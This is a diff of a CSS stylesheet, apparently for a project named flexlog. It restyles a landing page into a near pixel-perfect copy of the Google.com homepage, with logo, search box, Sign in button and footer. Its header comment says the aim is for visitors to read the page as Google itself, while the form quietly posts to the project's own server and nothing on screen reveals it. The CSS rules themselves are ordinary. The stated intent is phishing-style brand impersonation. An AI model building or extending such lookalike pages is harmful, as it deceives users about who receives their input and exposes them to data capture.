@@ -1,64 +1,304 @@
-/* Fake-page styling. Deliberately spare to look like a vanity search
-   redirect — no shared site chrome, no nav, no app branding. */
-.landing-body {
+/* Fake Google.com homepage. Intentionally pixel-close to google.com so a
+   casual visitor reads the page as Google itself. No flexlog branding,
+   no shared site chrome. Form posts to OUR server (landing.submit), not
+   to google.com — but visually nothing gives that away.
+
+   Type stack: Arial first (Google's actual fallback when Product Sans
+   isn't available), then system humanist sans. Zero network calls. */
+
+:root {
+  --g-text:        #202124;
+  --g-text-muted:  #5f6368;
+  --g-bg:          #ffffff;
+  --g-footer-bg:   #f2f2f2;
+  --g-border:      #dfe1e5;
+  --g-border-hov:  #ddd;
+  --g-shadow-low:  0 1px 6px rgb(32 33 36 / 8%);
+  --g-shadow-hi:   0 1px 6px rgb(32 33 36 / 28%);
+  --g-blue:        #1a73e8;
+}
+
+* { box-sizing: border-box; }
+
+html, body {
   margin: 0;
+  padding: 0;
+  height: 100%;
   font-family: arial, sans-serif;
-  background: #fff;
-  color: #202124;
-  min-height: 100vh;
+  color: var(--g-text);
+  background: var(--g-bg);
+}
+
+.g-body {
   display: flex;
   flex-direction: column;
+  min-height: 100vh;
+}
+
+/* ---------------------------------------------------------- Top header */
+
+.g-top {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 6px 18px;
+  font-size: 13px;
+  min-height: 60px;
+}
+
+.g-top-nav {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+}
+.g-top-nav-right {
+  margin-left: auto;
+}
+
+.g-top-link {
+  color: rgba(0, 0, 0, 0.87);
+  text-decoration: none;
+  padding: 0 4px;
+}
+.g-top-link:hover { text-decoration: underline; }
+
+.g-apps-button {
+  width: 40px;
+  height: 40px;
+  display: inline-flex;
+  align-items: center;
   justify-content: center;
+  border: 0;
+  border-radius: 50%;
+  background: transparent;
+  cursor: pointer;
+  margin: 0 4px;
+}
+.g-apps-button:hover { background: rgba(60, 64, 67, 0.08); }
+
+.g-signin {
+  display: inline-block;
+  background: var(--g-blue);
+  color: #fff;
+  padding: 8px 22px;
+  border-radius: 4px;
+  font-weight: 500;
+  text-decoration: none;
+  letter-spacing: 0.25px;
+  font-size: 14px;
+}
+.g-signin:hover {
+  background: #1765cc;
+  box-shadow: 0 1px 2px rgb(0 0 0 / 30%);
+}
+
+/* ---------------------------------------------------------- Main */
+
+.g-main {
+  flex: 1 0 auto;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 0 20px;
+  /* Google centers the logo about 35% from the top, not dead-center */
+  padding-top: clamp(10vh, 20vh, 200px);
+}
+
+/* ---------------------------------------------------------- Logo */
+
+.g-logo {
+  font-family: arial, sans-serif;
+  font-weight: 500;
+  font-size: 92px;
+  line-height: 1;
+  letter-spacing: -3px;
+  margin: 0 0 32px;
+  user-select: none;
+}
+.g-logo span {
+  display: inline-block;
+}
+
+/* ---------------------------------------------------------- Search */
+
+.g-form {
+  width: min(584px, 92vw);
+  display: flex;
+  flex-direction: column;
   align-items: center;
 }
-.landing-brand {
-  font-size: 5rem;
-  font-weight: 400;
-  margin: 0 0 2rem;
-  letter-spacing: -0.05em;
-}
-.landing-form {
-  width: min(584px, 90vw);
-}
-.landing-input {
+
+.g-search {
   width: 100%;
-  padding: 0.7rem 1rem;
-  border: 1px solid #dfe1e5;
-  border-radius: 24px;
-  font-size: 1rem;
-  outline: none;
-  box-shadow: 0 1px 6px rgb(32 33 36 / 8%);
-}
-.landing-input:focus {
-  box-shadow: 0 1px 6px rgb(32 33 36 / 28%);
-}
-.landing-actions {
+  height: 46px;
   display: flex;
-  gap: 0.75rem;
-  justify-content: center;
-  margin-top: 1.5rem;
+  align-items: center;
+  gap: 8px;
+  padding: 0 14px;
+  border: 1px solid var(--g-border);
+  border-radius: 24px;
+  background: var(--g-bg);
+  transition: box-shadow 0.15s ease, border-color 0.15s ease;
 }
-.landing-button {
+.g-search:hover {
+  border-color: rgba(223, 225, 229, 0);
+  box-shadow: var(--g-shadow-hi);
+}
+.g-search:focus-within {
+  border-color: rgba(223, 225, 229, 0);
+  box-shadow: var(--g-shadow-hi);
+}
+
+.g-search-icon {
+  flex-shrink: 0;
+  margin-right: 4px;
+}
+
+.g-search-input {
+  flex: 1;
+  height: 100%;
+  border: 0;
+  outline: 0;
+  font-family: arial, sans-serif;
+  font-size: 16px;
+  color: var(--g-text);
+  background: transparent;
+  padding: 0;
+}
+
+.g-icon-btn {
+  width: 32px;
+  height: 32px;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  border: 0;
+  background: transparent;
+  cursor: pointer;
+  border-radius: 50%;
+  flex-shrink: 0;
+}
+.g-icon-btn:hover { background: rgba(60, 64, 67, 0.08); }
+
+/* Vertical separator between mic and camera. Drawn via the icon-btn
+   not having border-left, so we add a thin spacer via a pseudo-element
+   on the second icon-btn for fidelity. */
+.g-icon-btn + .g-icon-btn {
+  position: relative;
+}
+.g-icon-btn + .g-icon-btn::before {
+  content: "";
+  position: absolute;
+  left: -8px;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 1px;
+  height: 24px;
+  background: var(--g-border);
+}
+
+/* ---------------------------------------------------------- Buttons */
+
+.g-actions {
+  display: flex;
+  gap: 12px;
+  margin-top: 28px;
+  flex-wrap: wrap;
+  justify-content: center;
+}
+
+.g-btn {
   background: #f8f9fa;
   border: 1px solid #f8f9fa;
   border-radius: 4px;
   color: #3c4043;
-  font-size: 0.875rem;
-  padding: 0.6rem 1rem;
+  font-family: arial, sans-serif;
+  font-size: 14px;
+  letter-spacing: 0.25px;
+  height: 36px;
+  padding: 0 16px;
   cursor: pointer;
+  user-select: none;
 }
-.landing-button:hover {
-  border-color: #dadce0;
+.g-btn:hover {
+  background: #f8f9fa;
+  border-color: var(--g-border-hov);
   box-shadow: 0 1px 1px rgb(0 0 0 / 10%);
+  color: #202124;
 }
-.visually-hidden {
+.g-btn:active {
+  border-color: #c6c6c6;
+}
+
+/* ---------------------------------------------------------- Languages */
+
+.g-langs {
+  font-size: 13px;
+  color: var(--g-text);
+  margin-top: 28px;
+  text-align: center;
+}
+.g-langs a {
+  color: var(--g-blue);
+  text-decoration: none;
+  margin: 0 6px;
+}
+.g-langs a:hover { text-decoration: underline; }
+
+/* ---------------------------------------------------------- Footer */
+
+.g-footer {
+  flex-shrink: 0;
+  background: var(--g-footer-bg);
+  font-size: 14px;
+  color: var(--g-text-muted);
+}
+
+.g-country {
+  padding: 15px 30px;
+  border-bottom: 1px solid #dadce0;
+}
+
+.g-foot-row {
+  display: flex;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 8px 30px;
+  padding: 12px 30px;
+}
+
+.g-foot-nav {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 6px 30px;
+}
+.g-foot-nav a {
+  color: var(--g-text-muted);
+  text-decoration: none;
+  padding: 8px 0;
+  letter-spacing: 0.2px;
+}
+.g-foot-nav a:hover { text-decoration: underline; }
+
+/* ---------------------------------------------------------- A11y */
+
+.g-visually-hidden {
   position: absolute;
   width: 1px;
   height: 1px;
   padding: 0;
   margin: -1px;
   overflow: hidden;
-  clip: rect(0,0,0,0);
+  clip: rect(0, 0, 0, 0);
   white-space: nowrap;
   border: 0;
+}
+
+/* ---------------------------------------------------------- Responsive */
+
+@media (max-width: 540px) {
+  .g-logo { font-size: 64px; letter-spacing: -2px; }
+  .g-main { padding-top: clamp(60px, 18vh, 160px); }
+  .g-actions { width: 100%; }
+  .g-btn { flex: 1; }
 }
